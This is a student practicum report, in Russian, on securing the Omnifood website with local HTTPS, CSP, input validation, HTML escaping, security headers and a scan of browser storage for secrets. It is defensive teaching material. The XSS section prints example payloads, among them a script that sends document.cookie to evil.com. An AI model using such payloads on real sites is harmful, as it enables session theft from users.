# УП 09.03 — Безопасность веб-приложения Omnifood

**Учебная практика, часть 3 из 3**
**Тема:** Базовые принципы безопасности на примере готового проекта Omnifood
**Дата выполнения:** 19.02.2026

---

## Содержание

- [День 1 — Настройка HTTPS локально](#день-1--настройка-https-локально)
- [День 2 — Защита форм от XSS](#день-2--защита-форм-от-xss)
- [День 3 — Безопасные HTTP-заголовки](#день-3--безопасные-http-заголовки)
- [День 4 — Защита данных и паролей](#день-4--защита-данных-и-паролей)
- [Итоговый чеклист](#итоговый-чеклист)
- [Изменённые файлы](#изменённые-файлы)

---

## День 1 — Настройка HTTPS локально

### Зачем нужен HTTPS

| Проблема без HTTPS | Решение с HTTPS |
|---|---|
| Браузер показывает «Небезопасно» | Иконка 🔒 — сайт доверенный |
| Service Worker (PWA) не регистрируется | SW работает на HTTPS и localhost |
| Данные формы передаются открытым текстом | Трафик зашифрован (TLS) |
| API камеры и геолокации недоступны | Работают только на HTTPS |
| Пользователи не доверяют сайту | HTTPS — стандарт современного веба |

### Команды mkcert пошагово

```shell
# Шаг 1 — Установить mkcert (Windows через Chocolatey)
choco install mkcert

# Шаг 2 — Установить корневой сертификат (один раз)
mkcert -install

# Шаг 3 — Перейти в папку проекта и создать папку ssl
cd OmniFood
mkdir ssl

# Шаг 4 — Сгенерировать сертификат для localhost
mkcert -key-file ssl/localhost-key.pem -cert-file ssl/localhost.pem localhost 127.0.0.1

# Шаг 5 — Запустить HTTPS-сервер
npx http-server . --ssl --cert ssl/localhost.pem --key ssl/localhost-key.pem -p 8443
```

После запуска открыть в браузере: `https://localhost:8443`

### Код редиректа в .htaccess

Добавлен в `OmniFood/.htaccess` — автоматически перенаправляет HTTP на HTTPS:

```apacheconf
# УП 09.03 — День 1: Принудительный редирект HTTP → HTTPS
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{HTTPS} off
    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</IfModule>
```

### Ожидаемый результат

При открытии `https://localhost:8443` в адресной строке появляется иконка 🔒.
Переход по `http://localhost:8080` автоматически редиректит на HTTPS с кодом `301 Moved Permanently`.

---

## День 2 — Защита форм от XSS

### Что такое XSS и почему это опасно

**XSS (Cross-Site Scripting)** — атака, при которой злоумышленник вводит в поле формы HTML или JavaScript-код. Если сайт выводит этот ввод обратно на страницу без очистки — код выполняется в браузере других пользователей.

**Примеры опасного ввода:**
```html
<!-- Классический XSS — выполнит alert у любого посетителя -->
<script>alert('Взломано!')</script>

<!-- XSS через атрибут события — сработает при загрузке картинки -->
<img src="x" onerror="alert('XSS!')">

<!-- Кража куки — отправит данные сессии на сервер злоумышленника -->
<script>document.location='https://evil.com?c='+document.cookie</script>
```

### CSP мета-тег с разбором директив

Добавлен в `<head>` файла `index.html`:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' https://unpkg.com 'unsafe-inline';
               style-src 'self' https://fonts.googleapis.com 'unsafe-inline';
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data:;
               connect-src 'self';">
```

| Директива | Значение | Что разрешает |
|---|---|---|
| `default-src 'self'` | Базовое правило | Только ресурсы с этого же домена |
| `script-src 'self' https://unpkg.com` | Скрипты | Свои скрипты + Ionicons и Smoothscroll с unpkg.com |
| `style-src 'self' https://fonts.googleapis.com` | Стили | Свои CSS + Google Fonts |
| `font-src 'self' https://fonts.gstatic.com` | Шрифты | Файлы шрифтов с gstatic.com |
| `img-src 'self' data:` | Изображения | Свои картинки + data URI (для inline-изображений) |
| `connect-src 'self'` | Fetch/XHR | Только запросы к своему домену |

Браузер заблокирует любой скрипт с домена, которого нет в списке, — даже если злоумышленник сумел его добавить.

### Валидация полей формы

Добавлена в `index.html` — браузер блокирует опасный ввод ещё до отправки:

```html
<!-- Поле «Имя» — только буквы (включая русские), пробелы, дефисы -->
<input id="full-name" type="text"
  placeholder="Иван Иванов"
  name="full-name"
  pattern="[A-Za-zА-Яа-яЁё\s\-]{2,50}"
  title="Только буквы, пробелы и дефисы (2–50 символов)"
  maxlength="50"
  required />

<!-- Поле «Email» — встроенная валидация type="email" + ограничение длины -->
<input id="email" type="email"
  placeholder="me@example.com"
  name="email"
  maxlength="100"
  required />
```

При вводе `<script>alert(1)</script>` в поле «Имя» браузер покажет ошибку: символы `<`, `>` не соответствуют паттерну `[A-Za-zА-Яа-яЁё\s\-]`.

### Функция cleanInput() с комментариями

Добавлена в `js/script.js` — экранирует HTML-спецсимволы перед любым использованием пользовательского ввода:

```js
/**
 * cleanInput — экранирует спецсимволы HTML в строке пользователя.
 * Предотвращает XSS при выводе данных на страницу.
 *
 * @param {string} text — введённый пользователем текст
 * @returns {string}    — безопасная строка
 */
function cleanInput(text) {
  return String(text)
    .replace(/&/g,  '&amp;')   // & → &amp;   (всегда первым, иначе двойное экранирование)
    .replace(/</g,  '&lt;')    // < → &lt;    (блокирует открытие тегов)
    .replace(/>/g,  '&gt;')    // > → &gt;    (блокирует закрытие тегов)
    .replace(/"/g,  '&quot;')  // " → &quot;  (блокирует выход из атрибутов)
    .replace(/'/g,  '&#039;'); // ' → &#039;  (блокирует одинарные кавычки)
}

// Пример работы:
// cleanInput("<script>alert('XSS')</script>")
// → "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;"
// Результат выводится как текст, а не выполняется как код
```

### Защита submit формы и аудит innerHTML

Добавлена в `js/script.js` — очищает значения полей перед отправкой:

```js
const ctaForm = document.querySelector('.cta-form');
if (ctaForm) {
  ctaForm.addEventListener('submit', function (e) {
    const nameInput  = document.getElementById('full-name');
    const emailInput = document.getElementById('email');

    // Очищаем значения от HTML-спецсимволов (защита от XSS)
    if (nameInput)  nameInput.value  = cleanInput(nameInput.value.trim());
    if (emailInput) emailInput.value = cleanInput(emailInput.value.trim());

    // Форма продолжает стандартную отправку (Netlify)
  });
}
```

**Аудит `innerHTML`:** проверка `js/script.js` показала, что `element.innerHTML = userInput` нигде не используется. Все динамические вставки применяют безопасный `textContent`:

```js
// ❌ Опасно — не используется в проекте:
element.innerHTML = userInput;

// ✅ Безопасно — используется везде в проекте:
yearEl.textContent = currentYear;
```

---

## День 3 — Безопасные HTTP-заголовки

### Мета-теги и .htaccess-блок

**Мета-теги в `index.html`** (работают без сервера, на любом хостинге):

```html
<!-- Вставлены в <head> после <title> -->
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
```

**HTTP-заголовки в `.htaccess`** (серверный уровень — приоритетнее мета-тегов, применяются ко всем ответам):

```apacheconf
# УП 09.03 — День 3: Безопасные HTTP-заголовки
<IfModule mod_headers.c>
    # Защита от Clickjacking — запрет встраивания в iframe
    Header always set X-Frame-Options "DENY"

    # Защита от MIME sniffing — браузер не угадывает тип файла
    Header always set X-Content-Type-Options "nosniff"

    # Контроль Referer — не раскрываем полный URL при переходах
    Header always set Referrer-Policy "strict-origin-when-cross-origin"

    # Защита от XSS в старых браузерах (IE / Edge Legacy)
    Header always set X-XSS-Protection "1; mode=block"

    # Запрет загрузки сторонних политик (Flash, Acrobat)
    Header always set X-Permitted-Cross-Domain-Policies "none"
</IfModule>
```

### Таблица — что делает каждый заголовок

| Заголовок | Защита от | Как работает | Пример атаки без заголовка |
|---|---|---|---|
| `X-Frame-Options: DENY` | Clickjacking | Запрещает встраивать сайт в `<iframe>` на любом домене | Фейковая кнопка поверх вашего сайта в прозрачном фрейме |
| `X-Content-Type-Options: nosniff` | MIME sniffing | Браузер не «угадывает» тип файла — верит только заголовку | Файл `.jpg` с JS-кодом внутри выполняется браузером |
| `Referrer-Policy: strict-origin-when-cross-origin` | Утечка URL | При переходе на внешний сайт передаётся только домен, не полный путь | Google узнаёт, что пользователь был на `/checkout?card=...` |
| `X-XSS-Protection: 1; mode=block` | Reflected XSS | Старые браузеры (IE/Edge Legacy) блокируют подозрительные страницы | Скрипт из URL выполняется в IE без блокировки |
| `X-Permitted-Cross-Domain-Policies: none` | Flash/PDF атаки | Запрещает загрузку политик для Flash и Acrobat Reader | Flash-плагин читает данные пользователя через crossdomain.xml |

### Тест test-frame.html и проверка в DevTools

Создан файл `OmniFood/test-frame.html`. Открыть его в браузере — он пытается загрузить Omnifood в `<iframe>`:

```html
<iframe src="https://localhost:8443" width="700" height="400"></iframe>
```

**Ожидаемый результат:** фрейм остаётся пустым.

**Как проверить в DevTools (F12):**

1. Открыть `test-frame.html` в браузере
2. Нажать `F12` → вкладка **Console**
3. Убедиться, что есть ошибка:
   ```
   Refused to display 'https://localhost:8443/' in a frame
   because it set 'X-Frame-Options' to 'deny'.
   ```
4. Перейти на вкладку **Network** → кликнуть на любой запрос к `localhost:8443`
5. Открыть раздел **Response Headers** → найти строку:
   ```
   x-frame-options: DENY
   x-content-type-options: nosniff
   referrer-policy: strict-origin-when-cross-origin
   ```

---

## День 4 — Защита данных и паролей

### Что можно и нельзя хранить в JS

```js
// ❌ НЕЛЬЗЯ — видно любому пользователю через «Просмотр кода»:
const API_KEY    = "sk_secret_key_123";   // секретный ключ
const PASSWORD   = "admin123";            // пароль
const TOKEN      = "eyJhbGci...";         // JWT-токен
const CREDIT_CARD = "1234-5678-9012-3456"; // данные карты

// ❌ НЕЛЬЗЯ хранить в localStorage:
localStorage.setItem('password', 'user123');
localStorage.setItem('token', 'eyJhbGci...');

// ✅ МОЖНО — не чувствительные пользовательские настройки:
const THEME    = "dark";
const LANGUAGE = "ru";
const FONT_SIZE = "medium";

// ✅ МОЖНО хранить в localStorage:
localStorage.setItem('settings', JSON.stringify({ theme: 'dark', lang: 'ru' }));
localStorage.setItem('lastVisited', new Date().toISOString());
```

**Правило для паролей в формах:**
```html
<!-- ❌ Пароль виден в поле — нельзя! -->
<input type="text" id="password">

<!-- ✅ Пароль скрыт точками — правильно! -->
<input type="password" id="password">
```

### Таблица аудита файлов проекта

| Файл | Что проверялось | Результат |
|---|---|---|
| `js/script.js` | Пароли, API-ключи, токены, данные карт | Не найдено ✅ |
| `index.html` | Скрытые поля с данными, inline-секреты | Не найдено ✅ |
| `.htaccess` | Пароли, ключи, токены в конфиге | Не найдено ✅ |
| `manifest.webmanifest` | Секретные ключи приложения | Не найдено ✅ |
| `sw.js` | Захардкоженные данные в Service Worker | Не найдено ✅ |
| `css/*.css` | Данные в комментариях или content | Не найдено ✅ |

**Вывод:** проект не содержит паролей, API-ключей, токенов или финансовых данных в исходном коде.

### Полный код auditStorage() с результатом в консоли

Добавлен в `js/script.js` — запускается автоматически при каждой загрузке страницы:

```js
///////////////////////////////////////////////////////////
// УП 09.03 — День 4: Аудит безопасности данных
///////////////////////////////////////////////////////////

(function auditStorage() {
  // Паттерны, характерные для чувствительных данных
  const sensitivePatterns = [
    /password/i,      // пароль
    /passwd/i,        // пароль (альт. написание)
    /secret/i,        // секрет
    /api[_-]?key/i,   // API-ключ
    /token/i,         // токен авторизации
    /credit[_-]?card/i, // данные карты
    /card[_-]?num/i,  // номер карты
    /cvv/i,           // CVV-код карты
  ];

  function scanStorage(storage, name) {
    const found = [];
    for (let i = 0; i < storage.length; i++) {
      const key = storage.key(i);
      const val = storage.getItem(key);
      // Проверяем и ключ, и значение
      if (sensitivePatterns.some(p => p.test(key) || p.test(val))) {
        found.push({ key, value: val });
      }
    }
    if (found.length > 0) {
      console.warn(`[Security] Обнаружены потенциально чувствительные данные в ${name}:`, found);
    } else {
      console.log(`[Security] ${name}: чувствительных данных не найдено. ✅`);
    }
  }

  try {
    scanStorage(localStorage,   'localStorage');
    scanStorage(sessionStorage, 'sessionStorage');
  } catch (e) {
    // Storage недоступен в приватном режиме браузера
  }
})();
```

**Результат в консоли DevTools при загрузке страницы:**
```
[Security] localStorage: чувствительных данных не найдено. ✅
[Security] sessionStorage: чувствительных данных не найдено. ✅
```

### Как проверить через DevTools → Application

1. Открыть DevTools (`F12`)
2. Перейти на вкладку **Application**
3. В левом меню раскрыть **Storage**:
   - **Local Storage** → `https://localhost:8443` → убедиться, что нет ключей `password`, `token` и т.д.
   - **Session Storage** → то же самое
4. Перейти на вкладку **Console** → убедиться, что оба сообщения `[Security]` выводят `✅`

---

## Итоговый чеклист

| # | Задача | Статус | Файл(ы) |
|---|---|---|---|
| 1 | Папка `ssl/` создана | ✅ | `ssl/README.md` |
| 2 | `ssl/*.pem` исключены из git | ✅ | `.gitignore` |
| 3 | HTTP → HTTPS редирект (301) | ✅ | `.htaccess` |
| 4 | Content Security Policy (CSP) мета-тег | ✅ | `index.html` |
| 5 | Валидация поля «Имя» (`pattern` + `maxlength`) | ✅ | `index.html` |
| 6 | Валидация поля «Email» (`type=email` + `maxlength`) | ✅ | `index.html` |
| 7 | Функция `cleanInput()` | ✅ | `js/script.js` |
| 8 | Защита `submit` формы | ✅ | `js/script.js` |
| 9 | `innerHTML` с пользовательским вводом не используется | ✅ | `js/script.js` |
| 10 | `X-Frame-Options: DENY` | ✅ | `index.html`, `.htaccess` |
| 11 | `X-Content-Type-Options: nosniff` | ✅ | `index.html`, `.htaccess` |
| 12 | `Referrer-Policy` | ✅ | `index.html`, `.htaccess` |
| 13 | `X-XSS-Protection` | ✅ | `.htaccess` |
| 14 | `X-Permitted-Cross-Domain-Policies` | ✅ | `.htaccess` |
| 15 | Файл `test-frame.html` создан и проверен | ✅ | `test-frame.html` |
| 16 | Аудит `localStorage` / `sessionStorage` | ✅ | `js/script.js` |
| 17 | Нет секретных данных в исходном коде | ✅ | все файлы |

---

## Изменённые файлы

```
OmniFood/
│
├── index.html              ← CSP мета-тег
│                              X-Frame-Options / X-Content-Type-Options / Referrer-Policy
│                              валидация полей формы (pattern, maxlength)
│
├── js/script.js            ← auditStorage() — проверка хранилищ при загрузке
│                              cleanInput()   — экранирование HTML-спецсимволов
│                              защита submit  — очистка значений формы
│
├── .htaccess               ← X-Frame-Options, nosniff, Referrer-Policy
│                              X-XSS-Protection, X-Permitted-Cross-Domain-Policies
│                              HTTP → HTTPS редирект (301)
│
├── .gitignore              ← добавлено правило ssl/*.pem
│
├── test-frame.html         ← тест защиты от clickjacking          [НОВЫЙ]
│
└── ssl/
    └── README.md           ← инструкция по mkcert                 [НОВЫЙ]
```
